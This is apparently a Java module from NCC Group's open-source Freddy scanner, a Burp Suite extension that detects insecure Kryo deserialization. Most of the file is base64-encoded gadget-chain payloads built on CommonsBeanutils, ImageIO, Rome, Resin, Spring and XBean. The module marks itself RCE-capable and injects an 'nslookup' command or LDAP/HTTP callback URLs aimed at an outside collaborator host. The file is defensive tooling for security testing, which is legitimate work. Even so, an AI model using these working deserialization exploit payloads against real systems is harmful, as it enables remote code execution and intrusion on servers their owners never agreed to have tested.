// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.java;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

/***********************************************************
 * Module targeting the StdInstantiatorStrategy of the
 * Java Kryo library.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class KryoAltStrategyModule extends FreddyModuleBase {
    //CommonsBeanutils payload data
    private static final int COMBU_PAYLOAD_CMD_OFFSET = 169;
    private static final String COMBU_PREFIX_B64 = "AQBqYXZhLnV0aWwuVHJlZU1h8AEBAW9yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b/IBAQJqYXZhLnV0aWwuQ29sbGVjdGlvbnMkUmV2ZXJzZUNvbXBhcmF0b/IBAWRhdGFiYXNlTWV0YURhdOECAQNjb20uc3VuLnJvd3NldC5KZGJjUm93U2V0SW1w7AEAAAAAAOAPAAHJAw==";
    private static final String COMBU_SUFFIX_B64 = "AdAPAAEEamF2YS51dGlsLlZlY3Rv8gEKAgECAQIBAgECAQIBAgECAQIBAgEEAAAAAAEFamF2YS51dGlsLkhhc2h0YWJs5QEAAAABANgPAAAAAQQBCgMBZm/vAAAAAAAAAAAAAAEDBgEDBgEDBg==";
    //ImageIO payload data
    private static final int IMAGEIO_PAYLOAD_CMD_OFFSET = 575;
    private static final String IMAGEIO_PREFIX_B64 = "AQBqYXZhLnV0aWwuSGFzaE1h8AECAQFqZGsubmFzaG9ybi5pbnRlcm5hbC5vYmplY3RzLk5hdGl2ZVN0cmlu5wEAAAAAAAABAmNvbS5zdW4ueG1sLmludGVybmFsLmJpbmQudjIucnVudGltZS51bm1hcnNoYWxsZXIuQmFzZTY0RGF04QEAAQNqYXZheC5hY3RpdmF0aW9uLkRhdGFIYW5kbGXyAQAAAQRjb20uc3VuLnhtbC5pbnRlcm5hbC53cy5lbmNvZGluZy54bWwuWE1MTWVzc2FnZSRYbWxEYXRhU291cmPlAQAAAQVqYXZheC5jcnlwdG8uQ2lwaGVySW5wdXRTdHJlYe0BAQZqYXZheC5jcnlwdG8uTnVsbENpcGhl8gEAAAAAAAEHamF2YS5sYW5nLk9iamVj9AEAAAEIamF2YXguaW1hZ2Vpby5zcGkuRmlsdGVySXRlcmF0b/IBAQlqYXZheC5pbWFnZWlvLkltYWdlSU8kQ29udGFpbnNGaWx0ZfIBAQAAAQEKamF2YS5sYW5nLlByb2Nlc3NCdWlsZGXyAAECAQELamF2YS5pby5JT0V4Y2VwdGlv7gAAAgFzdGFy9AAAAQEBAQxqYXZhLmxhbmcuUHJvY2Vz8wABAAANDgACEAAAERIAAAYABgFmb+8BCAEAAQ1qYXZhLnV0aWwuQ29sbGVjdGlvbnMkRW1wdHlJdGVyYXRv8gEBCgEBDmphdmEudXRpbC5BcnJheUxpc/QBAQMByQM=";
    private static final String IMAGEIO_SUFFIX_B64 = "AAAAAAMUAAAAAAABAQABD2phdmEubGFuZy5Qcm9jZXNzQnVpbGRlciROdWxsSW5wdXRTdHJlYe0BAAAAAAAAAAAAARBbTGphdmEuYXd0LmRhdGF0cmFuc2Zlci5EYXRhRmxhdm9yuwEBAAABAQMBAQMBAQM=";
    //LazySearchEnumeration payload data
    private static final int LSE_PAYLOAD_CMD_OFFSET = 597;
    private static final String LSE_PREFIX_B64 = "AQBqYXZhLnV0aWwuSGFzaE1h8AECAQFqZGsubmFzaG9ybi5pbnRlcm5hbC5vYmplY3RzLk5hdGl2ZVN0cmlu5wEAAAAAAAABAmNvbS5zdW4ueG1sLmludGVybmFsLmJpbmQudjIucnVudGltZS51bm1hcnNoYWxsZXIuQmFzZTY0RGF04QEAAQNqYXZheC5hY3RpdmF0aW9uLkRhdGFIYW5kbGXyAQAAAQRjb20uc3VuLnhtbC5pbnRlcm5hbC53cy5lbmNvZGluZy54bWwuWE1MTWVzc2FnZSRYbWxEYXRhU291cmPlAQAAAQVqYXZheC5jcnlwdG8uQ2lwaGVySW5wdXRTdHJlYe0BAQZqYXZheC5jcnlwdG8uTnVsbENpcGhl8gEAAAAAAAEHamF2YS5sYW5nLk9iamVj9AEAAAEIc3VuLm1pc2MuU2VydmljZSRMYXp5SXRlcmF0b/IBAQljb20uc3VuLmpuZGkudG9vbGtpdC5kaXIuTGF6eVNlYXJjaEVudW1lcmF0aW9uSW1w7AEBCQEAAAAAAAEKamF2YXgubmFtaW5nLmRpcmVjdG9yeS5TZWFyY2hSZXN1bPQBAAELamF2YXgubmFtaW5nLnNwaS5Db250aW51YXRpb25EaXJDb250ZXj0AQABDGphdmF4Lm5hbWluZy5DYW5ub3RQcm9jZWVkRXhjZXB0aW/uAQAAAQwPAAAAAAABDWphdmF4Lm5hbWluZy5SZWZlcmVuY+UBAQ5qYXZhLnV0aWwuVmVjdG/yAQABRnJlZGT5AckD";
    private static final String LSE_SUFFIX_B64 = "AUZv7wABAQEPamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZVJhbmRvbUFjY2Vzc0xpc/QBAAAAAAEBZm/vAAEQamF2YXgubmFtaW5nLmRpcmVjdG9yeS5TZWFyY2hDb250cm9s8wEAAAAAAgAAAAAAAQAAAAERamF2YS51dGlsLlRyZWVTZfQBAAAAAAAAAAABAQABEmphdmEubGFuZy5Qcm9jZXNzQnVpbGRlciROdWxsSW5wdXRTdHJlYe0BAAAAAAAAAAAAARNbTGphdmEuYXd0LmRhdGF0cmFuc2Zlci5EYXRhRmxhdm9yuwEBAAABAQMBAQMBAQM=";
    //Resin payload data
    private static final int RESIN_PAYLOAD_CMD_OFFSET = 191;
    private static final String RESIN_PREFIX_B64 = "AQBqYXZhLnV0aWwuSGFzaE1h8AECAQFjb20uY2F1Y2hvLm5hbWluZy5RTmFt5QEBAmphdmF4Lm5hbWluZy5zcGkuQ29udGludWF0aW9uRGlyQ29udGV49AEAAQNqYXZheC5uYW1pbmcuQ2Fubm90UHJvY2VlZEV4Y2VwdGlv7gEAAAAAAAAAAAEEamF2YXgubmFtaW5nLlJlZmVyZW5j5QEBBWphdmEudXRpbC5WZWN0b/IBAAFGcmVkZPkByQM=";
    private static final String RESIN_SUFFIX_B64 = "AUZv7wAAAAEGamF2YS51dGlsLkhhc2h0YWJs5QEAAQdqYXZhLnV0aWwuQXJyYXlMaXP0AQIDAWZv7wMBYmHyAQEDAQhjb20uc3VuLm9yZy5hcGFjaGUueHBhdGguaW50ZXJuYWwub2JqZWN0cy5YU3RyaW7nAQMBheunpg8aCwABCA8=";
    //Rome payload data
    private static final int ROME_PAYLOAD_CMD_OFFSET = 158;
    private static final String ROME_PREFIX_B64 = "AQBqYXZhLnV0aWwuSGFzaE1h8AECAQFjb20ucm9tZXRvb2xzLnJvbWUuZmVlZC5pbXBsLkVxdWFsc0JlYe4BAQECY29tLnJvbWV0b29scy5yb21lLmZlZWQuaW1wbC5Ub1N0cmluZ0JlYe4AAQIBAQEDY29tLnN1bi5yb3dzZXQuSmRiY1Jvd1NldEltcOwAAQMBAAAAAADgDwAByQM=";
    private static final String ROME_SUFFIX_B64 = "AdAPAAEEamF2YS51dGlsLlZlY3Rv8gEKAgECAQIBAgECAQIBAgECAQIBAgEEAAAAAAEFamF2YS51dGlsLkhhc2h0YWJs5QEAAAABANgPAAAAAQQBCgMBZm/vAAAAAAAAAAAAAAEBAwEBAwEBAw==";
    //SpringAbstractBeanFactory payload data
    private static final int SABF_PAYLOAD_CMD_OFFSET = 1445;
    private static final String SABF_PREFIX_B64 = "AQBqYXZhLnV0aWwuSGFzaE1h8AECAQHCAW9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLnN1cHBvcnQuRGVmYXVsdEJlYW5GYWN0b3J5UG9pbnRjdXRBZHZpc29yAQFjYWxsZfIBAsUBb3JnLnNwcmluZ2ZyYW1ld29yay5iZWFucy5mYWN0b3J5LnN1cHBvcnQuRGVmYXVsdExpc3RhYmxlQmVhbkZhY3RvcnkBAQNqYXZhLnV0aWwuY29uY3VycmVudC5Db25jdXJyZW50SGFzaE1h8AEAAQMBAAEBAQABBGphdmEudXRpbC5IYXNoU2X0AQABBcoBb3JnLnNwcmluZ2ZyYW1ld29yay5iZWFucy5mYWN0b3J5LnN1cHBvcnQuU2ltcGxlQXV0b3dpcmVDYW5kaWRhdGVSZXNvbHZlcgEAAQMBAQMEAQZvcmcuc3ByaW5nZnJhbWV3b3JrLmJlYW5zLmZhY3Rvcnkuc3VwcG9ydC5Sb290QmVhbkRlZmluaXRpb+4BAAEBB2phdmEudXRpbC5MaW5rZWRIYXNoTWHwAQABAAAAAQhqYXZhLmxhbmcuT2JqZWP0AQEJwwFvcmcuc3ByaW5nZnJhbWV3b3JrLmJlYW5zLmZhY3RvcnkuY29uZmlnLkNvbnN0cnVjdG9yQXJndW1lbnRWYWx1ZXMBAQpqYXZhLnV0aWwuTGlua2VkTGlz9AEAAQcBAAAAAAAAAAEBAAAAAW9i6gFzdGFy9AAAAAABAQtvcmcuc3ByaW5nZnJhbWV3b3JrLmJlYW5zLmZhY3Rvcnkuc3VwcG9ydC5NZXRob2RPdmVycmlkZfMBAAEEAQABAAEIAQAAAQxvcmcuc3ByaW5nZnJhbWV3b3JrLmJlYW5zLk11dGFibGVQcm9wZXJ0eVZhbHVl8wEAAAENamF2YS51dGlsLkFycmF5TGlz9AEAAAEHAQAAAAAAAAGBAAAAAQ0BAQMEAAENAQABAAEDAQAAAQABAAEDAQAAAQMBAAEHAQABAAEAAQoBAAEDAQABAwEAAQMBAAAAAAEEAQMBDmphdmEubGFuZy5DbGFz8wEBD29yZy5zcHJpbmdmcmFtZXdvcmsuYmVhbnMuZmFjdG9yeS5CZWFuQ2xhc3NMb2FkZXJBd2Fy5QABDgEBEG9yZy5zcHJpbmdmcmFtZXdvcmsuYmVhbnMuZmFjdG9yeS5CZWFuRmFjdG9yeUF3YXLlAAEOAQERb3JnLnNwcmluZ2ZyYW1ld29yay5iZWFucy5mYWN0b3J5LkJlYW5OYW1lQXdhcuUAAQQBAAEEAQABEtABb3JnLnNwcmluZ2ZyYW1ld29yay5iZWFucy5mYWN0b3J5LnN1cHBvcnQuQ2dsaWJTdWJjbGFzc2luZ0luc3RhbnRpYXRpb25TdHJhdGVneQEBE29yZy5hcGFjaGUuY29tbW9ucy5sb2dnaW5nLmltcGwuTm9PcExv5wEBFGphdmEudXRpbC5MaW5rZWRIYXNoU2X0AQABAwEAARVvcmcuc3ByaW5nZnJhbWV3b3JrLmNvcmUuRGVmYXVsdFBhcmFtZXRlck5hbWVEaXNjb3ZlcmXyAQEKAQIBFsMBb3JnLnNwcmluZ2ZyYW1ld29yay5jb3JlLlN0YW5kYXJkUmVmbGVjdGlvblBhcmFtZXRlck5hbWVEaXNjb3ZlcmVyAQEXwwFvcmcuc3ByaW5nZnJhbWV3b3JrLmNvcmUuTG9jYWxWYXJpYWJsZVRhYmxlUGFyYW1ldGVyTmFtZURpc2NvdmVyZXIBAQMBAAABFAEAARhqYXZhLmxhbmcuVGhyZWFkTG9jYewBndCiuAoBFAEAAQMBAAEHAQAAAAEDAQABAAEAAQMBAQMRARlqYXZhLmxhbmcuUHJvY2Vzc0J1aWxkZfIBAQ0BAQMByQM=";
    private static final String SABF_SUFFIX_B64 = "AAAAAAEEAQAAAAAAAAEab3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuVHJ1ZVBvaW50Y3X0AQEBAwEBAQAAAAEaQQEBQg==";
    //SpringPartiallyComparableAdvisor payload data
    private static final int SPCA_PAYLOAD_CMD_OFFSET = 562;
    private static final String SPCA_PREFIX_B64 = "AQBqYXZhLnV0aWwuSGFzaE1h8AECAQFvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC50YXJnZXQuSG90U3dhcHBhYmxlVGFyZ2V0U291cmPlAQEC7wFvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5hc3BlY3RqLmF1dG9wcm94eS5Bc3BlY3RKQXdhcmVBZHZpc29yQXV0b1Byb3h5Q3JlYXRvciRQYXJ0aWFsbHlDb21wYXJhYmxlQWR2aXNvckhvbGRlcgEBA29yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmFzcGVjdGouQXNwZWN0SlBvaW50Y3V0QWR2aXNv8gEBBG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmFzcGVjdGouQXNwZWN0SkFyb3VuZEFkdmlj5QEAAAABBcwBb3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuYXNwZWN0ai5hbm5vdGF0aW9uLkJlYW5GYWN0b3J5QXNwZWN0SW5zdGFuY2VGYWN0b3J5AQABBm9yZy5zcHJpbmdmcmFtZXdvcmsuam5kaS5zdXBwb3J0LlNpbXBsZUpuZGlCZWFuRmFjdG9y+QEBB29yZy5zcHJpbmdmcmFtZXdvcmsuam5kaS5KbmRpVGVtcGxhdOUBAAEIb3JnLmFwYWNoZS5jb21tb25zLmxvZ2dpbmcuaW1wbC5Ob09wTG/nAQEIAQEBAAEAAQlqYXZhLnV0aWwuSGFzaFNl9AEBAwHJAw==";
    private static final String SPCA_SUFFIX_B64 = "AQABAA4AAAEBCmphdmEubGFuZy5PYmplY/QAAAAAAAABdG9TdHJpbucBAQAAAAAAAAEBAwEBAQELY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLm9iamVjdHMuWFN0cmlu5wEDAYXurKUAFxAAAQET";
    //XBean payload data
    private static final int XBEAN_PAYLOAD_CMD_OFFSET = 196;
    private static final String XBEAN_PREFIX_B64 = "AQBqYXZhLnV0aWwuSGFzaE1h8AECAQFvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC50YXJnZXQuSG90U3dhcHBhYmxlVGFyZ2V0U291cmPlAQECb3JnLmFwYWNoZS54YmVhbi5uYW1pbmcuY29udGV4dC5Db250ZXh0VXRpbCRSZWFkT25seUJpbmRpbucBAQNqYXZheC5uYW1pbmcuUmVmZXJlbmPlAQEEamF2YS51dGlsLlZlY3Rv8gEAAUZyZWRk+QHJAw==";
    private static final String XBEAN_SUFFIX_B64 = "AWZv7wABBW9yZy5hcGFjaGUueGJlYW4ubmFtaW5nLmNvbnRleHQuV3JpdGFibGVDb250ZXj0AQAAAAAAAAAAAAAAAAAAAAEACQEDBQEBAwEBAQEGY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLm9iamVjdHMuWFN0cmlu5wEDAYXrjb0SDQQAAQEL";
    private byte[] COMBU_PAYLOAD;
    private byte[] IMAGEIO_PAYLOAD;
    private byte[] LSE_PAYLOAD;
    private byte[] RESIN_PAYLOAD;
    private byte[] ROME_PAYLOAD;
    private byte[] SABF_PAYLOAD;
    private byte[] SPCA_PAYLOAD;
    private byte[] XBEAN_PAYLOAD;

    protected void initialiseModule() {
        setName("Kryo-StdInstantiatorStrategy");
        setPlatform(TargetPlatform.JAVA);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        //Initialise payload buffers
        COMBU_PAYLOAD = buildBinaryPayloadBuffer(COMBU_PREFIX_B64, COMBU_SUFFIX_B64, false);
        IMAGEIO_PAYLOAD = buildBinaryPayloadBuffer(IMAGEIO_PREFIX_B64, IMAGEIO_SUFFIX_B64, false);
        LSE_PAYLOAD = buildBinaryPayloadBuffer(LSE_PREFIX_B64, LSE_SUFFIX_B64, false);
        RESIN_PAYLOAD = buildBinaryPayloadBuffer(RESIN_PREFIX_B64, RESIN_SUFFIX_B64, false);
        ROME_PAYLOAD = buildBinaryPayloadBuffer(ROME_PREFIX_B64, ROME_SUFFIX_B64, false);
        SABF_PAYLOAD = buildBinaryPayloadBuffer(SABF_PREFIX_B64, SABF_SUFFIX_B64, false);
        SPCA_PAYLOAD = buildBinaryPayloadBuffer(SPCA_PREFIX_B64, SPCA_SUFFIX_B64, false);
        XBEAN_PAYLOAD = buildBinaryPayloadBuffer(XBEAN_PREFIX_B64, XBEAN_SUFFIX_B64, false);

        //Register active scan payloads (passive scan is handled by KryoPassiveDetectionModule)
        registerActiveScanExceptionPayload(new byte[]{0x04}, "com.esotericsoftware.kryo.KryoException");

        registerActiveScanCollaboratorPayload(PN_COMBEANUTILS, true);
        registerActiveScanCollaboratorPayload(PN_IMAGEIO, true);
        registerActiveScanCollaboratorPayload(PN_LAZYSEARCH, true);
        registerActiveScanCollaboratorPayload(PN_RESIN, true);
        registerActiveScanCollaboratorPayload(PN_ROME, true);
        registerActiveScanCollaboratorPayload(PN_SPRINGABF, true);
        registerActiveScanCollaboratorPayload(PN_SPRINGPCA, true);
        registerActiveScanCollaboratorPayload(PN_XBEAN, true);
    }

    protected byte[] generateCollaboratorBytePayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_COMBEANUTILS:
                return generateBinaryPayload(COMBU_PAYLOAD, COMBU_PAYLOAD_CMD_OFFSET, "ldap://" + hostname + "/", false);

            case PN_IMAGEIO:
                return generateBinaryPayload(IMAGEIO_PAYLOAD, IMAGEIO_PAYLOAD_CMD_OFFSET, "nslookup " + hostname, false);

            case PN_LAZYSEARCH:
                return generateBinaryPayload(LSE_PAYLOAD, LSE_PAYLOAD_CMD_OFFSET, "http://" + hostname + "/", false);

            case PN_RESIN:
                return generateBinaryPayload(RESIN_PAYLOAD, RESIN_PAYLOAD_CMD_OFFSET, "http://" + hostname + "/", false);

            case PN_ROME:
                return generateBinaryPayload(ROME_PAYLOAD, ROME_PAYLOAD_CMD_OFFSET, "ldap://" + hostname + "/", false);

            case PN_SPRINGABF:
                return generateBinaryPayload(SABF_PAYLOAD, SABF_PAYLOAD_CMD_OFFSET, "ldap://" + hostname + "/", false);

            case PN_SPRINGPCA:
                return generateBinaryPayload(SPCA_PAYLOAD, SPCA_PAYLOAD_CMD_OFFSET, "ldap://" + hostname + "/", false);

            case PN_XBEAN:
                return generateBinaryPayload(XBEAN_PAYLOAD, XBEAN_PAYLOAD_CMD_OFFSET, "http://" + hostname + "/", false);
        }
        return null;
    }
}
